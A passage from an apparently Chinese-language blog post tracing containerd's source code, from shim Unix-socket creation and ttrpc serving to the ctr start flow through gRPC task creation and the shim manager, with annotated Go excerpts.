params.Protocol = \u0026#34;ttrpc\u0026#34; cmd, err := newCommand(ctx, id, opts.Address, opts.TTRPCAddress, opts.Debug) if err != nil { return params, err } grouping := id spec, err := readSpec() //... var sockets []*shimSocket s, err := newShimSocket(ctx, opts.Address, grouping, false) if err != nil { if errdefs.IsAlreadyExists(err) { params.Address = s.addr return params, nil } return params, err } sockets = append(sockets, s) cmd.ExtraFiles = append(cmd.ExtraFiles, s.f) goruntime.LockOSThread() if os.Getenv(\u0026#34;SCHED_CORE\u0026#34;) != \u0026#34;\u0026#34; { if err := schedcore.Create(schedcore.ProcessGroup); err != nil { return params, fmt.Errorf(\u0026#34;enable sched core support: %w\u0026#34;, err) } } if err := cmd.Start(); err != nil { return params, err } goruntime.UnlockOSThread() // 启动成功后，第一个 shim 退出，执行清理操作 defer func() { if retErr != nil { cmd.Process.Kill() } }() // make sure to wait after start go cmd.Wait() //... params.Address = sockets[0].addr return params, nil } shim socket套接字创建：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //shim socket创建 func newShimSocket(ctx context.Context, path, id string, debug bool) (*shimSocket, error) { address, err := shim.SocketAddress(ctx, path, id, debug) socket, err := shim.NewSocket(address) //... s := \u0026amp;shimSocket{ addr: address, s: socket, } f, err := socket.File() if err != nil { s.Close() return nil, err } s.f = f return s, nil } SocketAddress：生成一个唯一的位于/run/containerd/s/\u0026lt;哈希值\u0026gt;下的Unix 套接字地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 // SocketAddress returns a socket address func SocketAddress(ctx context.Context, socketPath, id string, debug bool) (string, error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return \u0026#34;\u0026#34;, err } path := filepath.Join(socketPath, ns, id) if debug { path = filepath.Join(path, \u0026#34;debug\u0026#34;) } d := sha256.Sum256([]byte(path)) return fmt.Sprintf(\u0026#34;unix://%s/%x\u0026#34;, filepath.Join(socketRoot, \u0026#34;s\u0026#34;), d), nil } NewSocket：设置sock文件权限\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 //真正的socket创建 // NewSocket returns a new socket func NewSocket(address string) (*net.UnixListener, error) { var ( sock = socket(address) path = sock.path() isAbstract = sock.isAbstract() perm = os.FileMode(0600) ) // Darwin needs +x to access socket, otherwise it\u0026#39;ll fail with \u0026#34;bind: permission denied\u0026#34; when running as non-root. if runtime.GOOS == \u0026#34;darwin\u0026#34; { perm = 0700 } if !isAbstract { if err := os.MkdirAll(filepath.Dir(path), perm); err != nil { return nil, fmt.Errorf(\u0026#34;mkdir failed for %s: %w\u0026#34;, path, err) } } l, err := net.Listen(\u0026#34;unix\u0026#34;, path) if err != nil { return nil, err } if !isAbstract { if err := os.Chmod(path, perm); err != nil { os.Remove(sock.path()) l.Close() return nil, fmt.Errorf(\u0026#34;chmod failed for %s: %w\u0026#34;, path, err) } } return l.(*net.UnixListener), nil } serve函数，启动 ttrpc 服务，并提供RPC服务：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // serve serves the ttrpc API over a unix socket in the current working directory // and blocks until the context is canceled func serve(ctx context.Context, server *ttrpc.Server, signals chan os.Signal, shutdown func()) error { dump := make(chan os.Signal, 32) setupDumpStacks(dump) path, err := os.Getwd() if err != nil { return err } //创建 Unix 套接字监听器 l, err := serveListener(socketFlag, 3) if err != nil { return err } // 启动 ttrpc 服务器 go func() { defer l.Close() if err := server.Serve(ctx, l); err != nil \u0026amp;\u0026amp; !errors.Is(err, net.ErrClosed) { log.G(ctx).WithError(err).Fatal(\u0026#34;containerd-shim: ttrpc server failure\u0026#34;) } }() //... go handleExitSignals(ctx, logger, shutdown) return reap(ctx, logger, signals) } 创建一个用于监听 Unix 套接字的 net.Listener\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // serve()会最终调用这个函数来启动服务监听 func serveListener(path string, fd uintptr) (net.Listener, error) { //创建监听器的逻辑 var ( l net.Listener err error ) //处理继承的文件描述符 if path == \u0026#34;\u0026#34; { //os.NewFile(fd, \u0026#34;socket\u0026#34;) 将文件描述符 fd 封装成 //一个*os.File 对象，并使用 net.FileListener 将其 //转换为 net.Listener，这样可以通过套接字进行通信。 l, err = net.FileListener(os.NewFile(fd, \u0026#34;socket\u0026#34;)) path = \u0026#34;[inherited from parent]\u0026#34; } else { //创建新的 Unix 套接字 if len(path) \u0026gt; socketPathLimit { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; %d)\u0026#34;, path, socketPathLimit) } l, err = net.Listen(\u0026#34;unix\u0026#34;, path) } if err != nil { return nil, err } log.L.WithField(\u0026#34;socket\u0026#34;, path).Debug(\u0026#34;serving api on socket\u0026#34;)· return l, nil } 回到serve函数，containerd-shim以注册服务的形式来对containerd提供容器相关操作，下面是相关服务注册的源码，可以看到shim通过调用runc容器运行时来创建容器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 func (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } 注：shim创建的与containerd通信的sock文件的mode为0600，实际情况与源码一致。\n8 容器启动流程分析 分析流程图如下，task.Start没有往下分析，它的函数传递流程与Newtask类似。\nctr解析命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 //调用command.NewClient()-\u0026gt;client.LoadContainer()-\u0026gt;NewTask()-\u0026gt;task.Start() /* 1、command.NewClient() 创建containerd client 2、LoadContainer() 3、NewTask() 4、task.Start() //如果收到退出信号 5、task.Delete(ctx) */ var startCommand = \u0026amp;cli.Command{ Name: \u0026#34;start\u0026#34;, Usage: \u0026#34;Start a container that has been created\u0026#34;, ArgsUsage: \u0026#34;CONTAINER\u0026#34;, Flags: append(platformStartFlags, []cli.Flag{ \u0026amp;cli.BoolFlag{ Name: \u0026#34;null-io\u0026#34;, Usage: \u0026#34;Send all IO to /dev/null\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;log-uri\u0026#34;, Usage: \u0026#34;Log uri\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;fifo-dir\u0026#34;, Usage: \u0026#34;Directory used for storing IO FIFOs\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;pid-file\u0026#34;, Usage: \u0026#34;File path to write the task\u0026#39;s pid\u0026#34;, }, \u0026amp;cli.BoolFlag{ Name: \u0026#34;detach\u0026#34;, Aliases: []string{\u0026#34;d\u0026#34;}, Usage: \u0026#34;Detach from the task after it has started execution\u0026#34;, }, }...), Action: func(cliContext *cli.Context) error { var ( err error id = cliContext.Args().Get(0) detach = cliContext.Bool(\u0026#34;detach\u0026#34;) ) if id == \u0026#34;\u0026#34; { return errors.New(\u0026#34;container id must be provided\u0026#34;) } client, ctx, cancel, err := commands.NewClient(cliContext) container, err := client.LoadContainer(ctx, id) spec, err := container.Spec(ctx) var ( tty = spec.Process.Terminal opts = GetNewTaskOpts(cliContext) ioOpts = []cio.Opt{cio.WithFIFODir(cliContext.String(\u0026#34;fifo-dir\u0026#34;))} ) var con console.Console if tty { con = console.Current() defer con.Reset() if err := con.SetRaw(); err != nil { return err } } task, err := NewTask(ctx, client, container, \u0026#34;\u0026#34;, con, cliContext.Bool(\u0026#34;null-io\u0026#34;), cliContext.String(\u0026#34;log-uri\u0026#34;), ioOpts, opts...) //... if err := task.Start(ctx); err != nil { return err } if tty { if err := HandleConsoleResize(ctx, task, con); err != nil { log.L.WithError(err).Error(\u0026#34;console resize\u0026#34;) } } else { sigc := commands.ForwardAllSignals(ctx, task) defer commands.StopCatch(sigc) } status := \u0026lt;-statusC code, _, err := status.Result() if err != nil { return err } if _, err := task.Delete(ctx); err != nil { return err } if code != 0 { return cli.Exit(\u0026#34;\u0026#34;, int(code)) } return nil }, } 1、containerd client创建\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // containerd\\containerd\\cmd\\ctr\\commands\\client.go // NewClient returns a new containerd client func NewClient(cliContext *cli.Context, opts ...containerd.Opt) (*containerd.Client, context.Context, context.CancelFunc, error) { timeoutOpt := containerd.WithTimeout(cliContext.Duration(\u0026#34;connect-timeout\u0026#34;)) opts = append(opts, timeoutOpt) client, err := containerd.New(cliContext.String(\u0026#34;address\u0026#34;), opts...) if err != nil { return nil, nil, nil, err } ctx, cancel := AppContext(cliContext) var suppressDeprecationWarnings bool if !suppressDeprecationWarnings { resp, err := client.IntrospectionService().Server(ctx) if err != nil { log.L.WithError(err).Warn(\u0026#34;Failed to check deprecations\u0026#34;) } else { for _, d := range resp.Deprecations { log.L.Warn(\u0026#34;DEPRECATION: \u0026#34; + d.Message) } } } return client, ctx, cancel, nil } 1、实际调用New函数创建\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 // containerd\\containerd\\client\\client.go // New returns a new containerd client that is connected to the containerd // instance provided by address func New(address string, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } if copts.timeout == 0 { copts.timeout = 10 * time.Second } c := \u0026amp;Client{ defaultns: copts.defaultns, } if copts.defaultRuntime != \u0026#34;\u0026#34; { c.runtime = copts.defaultRuntime } else { c.runtime = defaults.DefaultRuntime } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } if copts.services != nil { c.services = *copts.services } if address != \u0026#34;\u0026#34; { backoffConfig := backoff.DefaultConfig backoffConfig.MaxDelay = copts.timeout connParams := grpc.ConnectParams{ Backoff: backoffConfig, } gopts := []grpc.DialOption{ grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithConnectParams(connParams), grpc.WithContextDialer(dialer.ContextDialer), } if len(copts.dialOptions) \u0026gt; 0 { gopts = copts.dialOptions } gopts = append(gopts, grpc.WithDefaultCallOptions( grpc.MaxCallRecvMsgSize(defaults.DefaultMaxRecvMsgSize), grpc.MaxCallSendMsgSize(defaults.DefaultMaxSendMsgSize))) if len(copts.callOptions) \u0026gt; 0 { gopts = append(gopts, grpc.WithDefaultCallOptions(copts.callOptions...)) } if copts.defaultns != \u0026#34;\u0026#34; { unary, stream := newNSInterceptors(copts.defaultns) gopts = append(gopts, grpc.WithChainUnaryInterceptor(unary)) gopts = append(gopts, grpc.WithChainStreamInterceptor(stream)) } connector := func() (*grpc.ClientConn, error) { conn, err := grpc.NewClient(dialer.DialAddress(address), gopts...) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to dial %q: %w\u0026#34;, address, err) } return conn, nil } conn, err := connector() if err != nil { return nil, err } c.conn, c.connector = conn, connector } if copts.services == nil \u0026amp;\u0026amp; c.conn == nil { return nil, fmt.Errorf(\u0026#34;no grpc connection or services is available: %w\u0026#34;, errdefs.ErrUnavailable) } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } return c, nil } 2、加载container\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // containerd\\containerd\\client\\client.go // LoadContainer loads an existing container from metadata func (c *Client) LoadContainer(ctx context.Context, id string) (Container, error) { ctx, span := tracing.StartSpan(ctx, \u0026#34;client.LoadContainer\u0026#34;) defer span.End() r, err := c.ContainerService().Get(ctx, id) if err != nil { return nil, err } span.SetAttributes( tracing.Attribute(\u0026#34;container.id\u0026#34;, r.ID), tracing.Attribute(\u0026#34;container.image.ref\u0026#34;, r.Image), tracing.Attribute(\u0026#34;container.runtime.name\u0026#34;, r.Runtime.Name), tracing.Attribute(\u0026#34;container.snapshotter.name\u0026#34;, r.Snapshotter), tracing.Attribute(\u0026#34;container.createdAt\u0026#34;, r.CreatedAt.Format(time.RFC3339)), tracing.Attribute(\u0026#34;container.updatedAt\u0026#34;, r.UpdatedAt.Format(time.RFC3339)), ) return containerFromRecord(c, r), nil } 2、ContainerService实际是调用的NewRemoteContainerStore，返回NewContainersClient\n1 2 3 4 5 6 7 8 9 // ContainerService returns the underlying container Store func (c *Client) ContainerService() containers.Store { if c.containerStore != nil { return c.containerStore } c.connMu.Lock() defer c.connMu.Unlock() return NewRemoteContainerStore(containersapi.NewContainersClient(c.conn)) } 2、gRPC调用containerd的containers.Get函数\ncontainerd/containerd/api/services/containers/v1/containers_grpc.pb.go\n1 2 3 4 5 6 7 8 func (c *containersClient) Get(ctx context.Context, in *GetContainerRequest, opts ...grpc.CallOption) (*GetContainerResponse, error) { out := new(GetContainerResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.services.containers.v1.Containers/Get\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 2、containerd接收并处理请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // containerd/containerd/api/services/containers/v1/containers_grpc.pb.go func _Containers_Get_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(GetContainerRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(ContainersServer).Get(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.services.containers.v1.Containers/Get\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(ContainersServer).Get(ctx, req.(*GetContainerRequest)) } return interceptor(ctx, in, info, handler) } 2、接着调用local.Get()函数处理（这里有个对象的转换ContainersServer转换到Service再转换到local）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // containerd/containerd/api/services/containers/v1/containers_grpc.pb.go // 这里调用底层的数据库获取contianer func (l *local) Get(ctx context.Context, req *api.GetContainerRequest, _ ...grpc.CallOption) (*api.GetContainerResponse, error) { var resp api.GetContainerResponse return \u0026amp;resp, errdefs.ToGRPC(l.withStoreView(ctx, func(ctx context.Context) error { container, err := l.Store.Get(ctx, req.ID) if err != nil { return err } containerpb := containerToProto(\u0026amp;container) resp.Container = containerpb return nil })) } 3、NewTask创建容器请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // containerd\\containerd\\cmd\\ctr\\commands\\tasks\\tasks_unix.go //NewTask creates a new task func NewTask(ctx context.Context, client *containerd.Client, container containerd.Container, checkpoint string, con console.Console, nullIO bool, logURI string, ioOpts []cio.Opt, opts ...containerd.NewTaskOpts) (containerd.Task, error) { stdinC := \u0026amp;stdinCloser{ stdin: os.Stdin, } if checkpoint != \u0026#34;\u0026#34; { im, err := client.GetImage(ctx, checkpoint) if err != nil { return nil, err } opts = append(opts, containerd.WithTaskCheckpoint(im)) } spec, err := container.Spec(ctx) if err != nil { return nil, err } if spec.Linux != nil { if len(spec.Linux.UIDMappings) != 0 { opts = append(opts, containerd.WithUIDOwner(spec.Linux.UIDMappings[0].HostID)) } if len(spec.Linux.GIDMappings) != 0 { opts = append(opts, containerd.WithGIDOwner(spec.Linux.GIDMappings[0].HostID)) } } var ioCreator cio.Creator if con != nil { if nullIO { return nil, errors.New(\u0026#34;tty and null-io cannot be used together\u0026#34;) } ioCreator = cio.NewCreator(append([]cio.Opt{cio.WithStreams(con, con, nil), cio.WithTerminal}, ioOpts...)...) } else if nullIO { ioCreator = cio.NullIO } else if logURI != \u0026#34;\u0026#34; { u, err := url.Parse(logURI) if err != nil { return nil, err } ioCreator = cio.LogURI(u) } else { ioCreator = cio.NewCreator(append([]cio.Opt{cio.WithStreams(stdinC, os.Stdout, os.Stderr)}, ioOpts...)...) } t, err := container.NewTask(ctx, ioCreator, opts...) if err != nil { return nil, err } stdinC.closer = func() { t.CloseIO(ctx, containerd.WithStdinCloser) } return t, nil } 3、调用container.NewTask函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 //containerd\\containerd\\client\\container.go func (c *container) NewTask(ctx context.Context, ioCreate cio.Creator, opts ...NewTaskOpts) (_ Task, err error) { ctx, span := tracing.StartSpan(ctx, \u0026#34;container.NewTask\u0026#34;) defer span.End() i, err := ioCreate(c.id) if err != nil { return nil, err } defer func() { if err != nil \u0026amp;\u0026amp; i != nil { i.Cancel() i.Close() } }() cfg := i.Config() request := \u0026amp;tasks.CreateTaskRequest{ ContainerID: c.id, Terminal: cfg.Terminal, Stdin: cfg.Stdin, Stdout: cfg.Stdout, Stderr: cfg.Stderr, } r, err := c.get(ctx) if err != nil { return nil, err } if r.SnapshotKey != \u0026#34;\u0026#34; { if r.Snapshotter == \u0026#34;\u0026#34; { return nil, fmt.Errorf(\u0026#34;unable to resolve rootfs mounts without snapshotter on container: %w\u0026#34;, errdefs.ErrInvalidArgument) } // get the rootfs from the snapshotter and add it to the request s, err := c.client.getSnapshotter(ctx, r.Snapshotter) if err != nil { return nil, err } mounts, err := s.Mounts(ctx, r.SnapshotKey) if err != nil { return nil, err } spec, err := c.Spec(ctx) if err != nil { return nil, err } for _, m := range mounts { if spec.Linux != nil \u0026amp;\u0026amp; spec.Linux.MountLabel != \u0026#34;\u0026#34; { if ml := label.FormatMountLabel(\u0026#34;\u0026#34;, spec.Linux.MountLabel); ml != \u0026#34;\u0026#34; { m.Options = append(m.Options, ml) } } request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } } info := TaskInfo{ runtime: r.Runtime.Name, } for _, o := range opts { if err := o(ctx, c.client, \u0026amp;info); err != nil { return nil, err } } for _, m := range info.RootFS { request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } request.RuntimePath = info.RuntimePath if info.Options != nil { o, err := typeurl.MarshalAny(info.Options) if err != nil { return nil, err } request.Options = typeurl.MarshalProto(o) } t := \u0026amp;task{ client: c.client, io: i, id: c.id, c: c, } if info.Checkpoint != nil { request.Checkpoint = info.Checkpoint } span.SetAttributes( tracing.Attribute(\u0026#34;task.container.id\u0026#34;, request.ContainerID), tracing.Attribute(\u0026#34;task.request.options\u0026#34;, request.Options.String()), tracing.Attribute(\u0026#34;task.runtime.name\u0026#34;, info.runtime), ) response, err := c.client.TaskService().Create(ctx, request) if err != nil { return nil, errdefs.FromGRPC(err) } span.AddEvent(\u0026#34;task created\u0026#34;, tracing.Attribute(\u0026#34;task.process.id\u0026#34;, int(response.Pid)), ) t.pid = response.Pid return t, nil } 3、Taskservice获取TasksClient实例\n1 2 3 4 5 6 7 8 9 // TaskService returns the underlying TasksClient func (c *Client) TaskService() tasks.TasksClient { if c.taskService != nil { return c.taskService } c.connMu.Lock() defer c.connMu.Unlock() return tasks.NewTasksClient(c.conn) } 3、通过gRPC发送给containerd\n源码路径：containerd/api/services/tasks/v1/tasks_grpc.pb.go\n1 2 3 4 5 6 7 8 func (c *tasksClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) { out := new(CreateTaskResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.services.tasks.v1.Tasks/Create\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 3、containerd接收并处理请求\n源码路径：containerd/api/services/tasks/v1/tasks_grpc.pb.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func _Tasks_Create_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(CreateTaskRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TasksServer).Create(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.services.tasks.v1.Tasks/Create\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TasksServer).Create(ctx, req.(*CreateTaskRequest)) } return interceptor(ctx, in, info, handler) } 3、实际调用local的相关函数处理（这里也有对象的转换）\n源码路径：containerd/plugins/services/tasks/local.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 func (l *local) Create(ctx context.Context, r *api.CreateTaskRequest, _ ...grpc.CallOption) (*api.CreateTaskResponse, error) { container, err := l.getContainer(ctx, r.ContainerID) if err != nil { return nil, errdefs.ToGRPC(err) } var ( checkpointPath string taskAPIAddress string taskAPIVersion uint32 ) if r.Options != nil { taskOptions, err := formatOptions(container.Runtime.Name, r.Options) if err != nil { return nil, err } checkpointPath = taskOptions.CriuImagePath taskAPIAddress = taskOptions.TaskApiAddress taskAPIVersion = taskOptions.TaskApiVersion } // jump get checkpointPath from checkpoint image if checkpointPath == \u0026#34;\u0026#34; \u0026amp;\u0026amp; r.Checkpoint != nil { checkpointPath, err = os.MkdirTemp(os.Getenv(\u0026#34;XDG_RUNTIME_DIR\u0026#34;), \u0026#34;ctrd-checkpoint\u0026#34;) if err != nil { return nil, err } if r.Checkpoint.MediaType != images.MediaTypeContainerd1Checkpoint { return nil, fmt.Errorf(\u0026#34;unsupported checkpoint type %q\u0026#34;, r.Checkpoint.MediaType) } reader, err := l.store.ReaderAt(ctx, ocispec.Descriptor{ MediaType: r.Checkpoint.MediaType, Digest: digest.Digest(r.Checkpoint.Digest), Size: r.Checkpoint.Size, Annotations: r.Checkpoint.Annotations, }) if err != nil { return nil, err } _, err = archive.Apply(ctx, checkpointPath, content.NewReader(reader)) reader.Close() if err != nil { return nil, err } } opts := runtime.CreateOpts{ Spec: container.Spec, IO: runtime.IO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: checkpointPath, Runtime: container.Runtime.Name, RuntimeOptions: container.Runtime.Options, TaskOptions: r.Options, SandboxID: container.SandboxID, Address: taskAPIAddress, Version: taskAPIVersion, } if r.RuntimePath != \u0026#34;\u0026#34; { opts.Runtime = r.RuntimePath } for _, m := range r.Rootfs { opts.Rootfs = append(opts.Rootfs, mount.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } rtime := l.v2Runtime _, err = rtime.Get(ctx, r.ContainerID) if err != nil \u0026amp;\u0026amp; !errdefs.IsNotFound(err) { return nil, errdefs.ToGRPC(err) } if err == nil { return nil, errdefs.ToGRPC(fmt.Errorf(\u0026#34;task %s: %w\u0026#34;, r.ContainerID, errdefs.ErrAlreadyExists)) } c, err := rtime.Create(ctx, r.ContainerID, opts) if err != nil { return nil, errdefs.ToGRPC(err) } labels := map[string]string{\u0026#34;runtime\u0026#34;: container.Runtime.Name} if err := l.monitor.Monitor(c, labels); err != nil { return nil, fmt.Errorf(\u0026#34;monitor task: %w\u0026#34;, err) } pid, err := c.PID(ctx) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to get task pid: %w\u0026#34;, err) } return \u0026amp;api.CreateTaskResponse{ ContainerID: r.ContainerID, Pid: pid, }, nil } 3、调用runtime.PlatformRuntime.create，PlatformRuntime接口实际由TaskManager实现，也就是TaskManager.Create。Create函数的关键调用流程有点多，我们一一分析。\n1.m.manager.Start()\n2.newShimTask(shim)\n3.shimTask.Create()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 //源码路径：containerd\\containerd\\core\\runtime\\v2\\task_manager.go // Create launches new shim instance and creates new task func (m *TaskManager) Create(ctx context.Context, taskID string, opts runtime.CreateOpts) (_ runtime.Task, retErr error) { bundle, err := NewBundle(ctx, m.root, m.state, taskID, opts.Spec) if err != nil { return nil, err } defer func() { if retErr != nil { bundle.Delete() } }() shim, err := m.manager.Start(ctx, taskID, bundle, opts) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to start shim: %w\u0026#34;, err) } // Cast to shim task and call task service to create a new container task instance. // This will not be required once shim service / client implemented. shimTask, err := newShimTask(shim) if err != nil { return nil, err } // runc ignores silently features it doesn\u0026#39;t know about, so for things that this is // problematic let\u0026#39;s check if this runc version supports them. if err := m.validateRuntimeFeatures(ctx, opts); err != nil { return nil, fmt.Errorf(\u0026#34;failed to validate OCI runtime features: %w\u0026#34;, err) } t, err := shimTask.Create(ctx, opts) if err != nil { // NOTE: ctx contains required namespace information. m.manager.shims.Delete(ctx, taskID) dctx, cancel := timeout.WithContext(cleanup.Background(ctx), cleanupTimeout) defer cancel() sandboxed := opts.SandboxID != \u0026#34;\u0026#34; _, errShim := shimTask.delete(dctx, sandboxed, func(context.Context, string) {}) if errShim != nil { if errdefs.IsDeadlineExceeded(errShim) { dctx, cancel = timeout.WithContext(cleanup.Background(ctx), cleanupTimeout) defer cancel() } shimTask.Shutdown(dctx) shimTask.Close() } return nil, fmt.Errorf(\u0026#34;failed to create shim task: %w\u0026#34;, err) } return t, nil } 3.1、m.manager.Start()调用ShimManager.Start\ncontainerd\\containerd\\core\\runtime\\v2\\shim_manager.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 // Start launches a new shim instance func (m *ShimManager) Start(ctx context.Context, id string, bundle *Bundle, opts runtime.CreateOpts) (_ ShimInstance, retErr error) { // This container belongs to sandbox which supposed to be already started via sandbox API. if opts.SandboxID != \u0026#34;\u0026#34; { var params shimbinary.BootstrapParams if opts.Address != \u0026#34;\u0026#34; { // The address returned from sandbox controller should be in the form like ttrpc+unix://\u0026lt;uds-path\u0026gt; // or grpc+vsock://\u0026lt;cid\u0026gt;:\u0026lt;port\u0026gt;, we should get the protocol from the url first. protocol, address, ok := strings.Cut(opts.Address, \u0026#34;+\u0026#34;) if !ok { return nil, fmt.Errorf(\u0026#34;the scheme of sandbox address should be in \u0026#34; + \u0026#34; the form of \u0026lt;protocol\u0026gt;+\u0026lt;unix|vsock|tcp\u0026gt;, i.e. ttrpc+unix or grpc+vsock\u0026#34;) } params = shimbinary.BootstrapParams{ Version: int(opts.Version), Protocol: protocol, Address: address, } } else { // For those sandbox we can not get endpoint, // fallback to legacy implementation process, err := m.Get(ctx, opts.SandboxID) if err != nil { return nil, fmt.Errorf(\u0026#34;can\u0026#39;t find sandbox %s\u0026#34;, opts.SandboxID) } p, restoreErr := restoreBootstrapParams(process.Bundle()) if restoreErr != nil { return nil, fmt.Errorf(\u0026#34;failed to get bootstrap \u0026#34;+ \u0026#34;params of sandbox %s, %v, legacy restore error %v\u0026#34;, opts.SandboxID, err, restoreErr) } params = p } // Write sandbox ID this task belongs to. if err := os.WriteFile(filepath.Join(bundle.Path, \u0026#34;sandbox\u0026#34;), []byte(opts.SandboxID), 0600); err != nil { return nil, err } if err := writeBootstrapParams(filepath.Join(bundle.Path, \u0026#34;bootstrap.json\u0026#34;), params); err != nil { return nil, fmt.Errorf(\u0026#34;failed to write bootstrap.json for bundle %s: %w\u0026#34;, bundle.Path, err) } shim, err := loadShim(ctx, bundle, func() 